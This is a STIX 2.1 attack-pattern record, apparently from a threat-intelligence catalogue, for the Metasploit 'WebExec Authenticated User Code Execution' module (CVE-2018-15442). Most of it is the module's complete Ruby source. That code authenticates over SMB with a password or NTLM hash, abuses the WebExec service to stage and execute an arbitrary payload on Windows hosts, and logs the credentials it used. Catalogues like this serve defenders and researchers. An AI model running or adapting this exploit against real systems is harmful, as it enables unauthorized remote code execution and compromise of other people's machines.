{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a7020a12-0fd3-4a31-92a7-237e7c763422",
    "created": "2024-08-14T16:56:11.63323Z",
    "modified": "2024-08-14T16:56:11.633235Z",
    "name": "WebExec Authenticated User Code Execution",
    "description": " This module uses a valid username and password of any level (or password hash) to execute an arbitrary payload. This module is similar to the \"psexec\" module, except allows any non-guest account by default. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/webexec.rb",
            "external_id": "webexec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://webexec.org"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-15442"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# Windows XP systems that are not part of a domain default to treating all\n# network logons as if they were Guest. This prevents SMB relay attacks from\n# gaining administrative access to these systems. This setting can be found\n# under:\n#\n#  Local Security Settings >\n#   Local Policies >\n#    Security Options >\n#     Network Access: Sharing and security model for local accounts\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Remote::SMB::Client::WebExec\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WebExec Authenticated User Code Execution',\n      'Description'    => %q{\n        This module uses a valid username and password of any level (or\n        password hash) to execute an arbitrary payload. This module is similar\n        to the \"psexec\" module, except allows any non-guest account by default.\n      },\n      'Author'         =>\n        [\n          'Ron <ron@skullsecurity.net>',\n        ],\n      'License'        => MSF_LICENSE,\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'WfsDelay'     => 10,\n          'EXITFUNC' => 'thread'\n        },\n      'References'     =>\n        [\n          ['URL', 'https://webexec.org'],\n          [ 'CVE', '2018-15442' ],\n        ],\n      'Payload'        =>\n        {\n          'Space'        => 3072,\n          'DisableNops'  => true\n        },\n      'Platform'       => 'win',\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'Targets'        =>\n        [\n          [ 'Automatic', { } ],\n          [ 'Native upload', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2018-10-24'\n    ))\n\n    register_options(\n      [\n        # This has to be a full path, %ENV% variables are not expanded\n        OptString.new('TMPDIR',     [ true, \"The directory to stage our payload in\", \"c:\\\\Windows\\\\Temp\\\\\" ])\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new('ALLOW_GUEST', [true, \"Keep trying if only given guest access\", false]),\n        OptInt.new('MAX_LINE_LENGTH', [true, \"The length of lines when splitting up the payload\", 1000]),\n      ])\n  end\n\n  # This is the callback for cmdstager, which breaks the full command into\n  # chunks and sends it our way. We have to do a bit of finangling to make it\n  # work correctly\n  def execute_command(command, opts)\n    # Replace the empty string, \"\", with a workaround - the first 0 characters of \"A\"\n    command = command.gsub('\"\"', 'mid(Chr(65), 1, 0)')\n\n    # Replace quoted strings with Chr(XX) versions, in a naive way\n    command = command.gsub(/\"[^\"]*\"/) do |capture|\n      capture.gsub(/\"/, \"\").chars.map do |c|\n        \"Chr(#{c.ord})\"\n      end.join('+')\n    end\n\n    # Prepend \"cmd /c\" so we can use a redirect\n    command = \"cmd /c \" + command\n\n    execute_single_command(command, opts)\n  end\n\n  def exploit\n    print_status(\"Connecting to the server...\")\n    connect\n\n    print_status(\"Authenticating to #{smbhost} as user '#{splitname(datastore['SMBUser'])}'...\")\n    smb_login\n\n    if not simple.client.auth_user and not datastore['ALLOW_GUEST']\n      print_line(\" \")\n      print_error(\n        \"FAILED! The remote host has only provided us with Guest privileges. \" +\n        \"Please make sure that the correct username and password have been provided. \" +\n        \"Windows XP systems that are not part of a domain will only provide Guest privileges \" +\n        \"to network logins by default.\"\n      )\n      print_line(\" \")\n      disconnect\n      return\n    end\n\n    begin\n      if datastore['SMBUser'].to_s.strip.length > 0\n        report_auth\n      end\n\n      # Avoid implementing NTLMSSP on Windows XP\n      # http://seclists.org/metasploit/2009/q1/6\n      if smb_peer_os == \"Windows 5.1\"\n        connect(versions: [1])\n        smb_login\n      end\n\n      wexec(true) do |opts|\n        opts[:flavor] = :vbs\n        opts[:linemax] = datastore['MAX_LINE_LENGTH']\n        opts[:temp] = datastore['TMPDIR']\n        opts[:delay] = 0.05\n        execute_cmdstager(opts)\n      end\n      handler\n      disconnect\n    end\n\n  end\n\n  def report_auth\n    service_data = {\n        address: ::Rex::Socket.getaddress(datastore['RHOST'],true),\n        port: datastore['RPORT'],\n        service_name: 'smb',\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n        origin_type: :service,\n        module_fullname: self.fullname,\n        private_data: datastore['SMBPass'],\n        username: datastore['SMBUser'].downcase\n    }\n\n    if datastore['SMBDomain'] and datastore['SMBDomain'] != 'WORKGROUP'\n      credential_data.merge!({\n        realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,\n        realm_value: datastore['SMBDomain']\n       })\n    end\n\n    if datastore['SMBPass'] =~ /[0-9a-fA-F]{32}:[0-9a-fA-F]{32}/\n      credential_data.merge!({:private_type => :ntlm_hash})\n    else\n      credential_data.merge!({:private_type => :password})\n    end\n\n    credential_data.merge!(service_data)\n\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n        access_level: 'Admin',\n        core: credential_core,\n        last_attempted_at: DateTime.now,\n        status: Metasploit::Model::Login::Status::SUCCESSFUL\n    }\n\n    login_data.merge!(service_data)\n    create_credential_login(login_data)\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-10-24",
    "x_mitre_platforms": [
        "win'"
    ]
}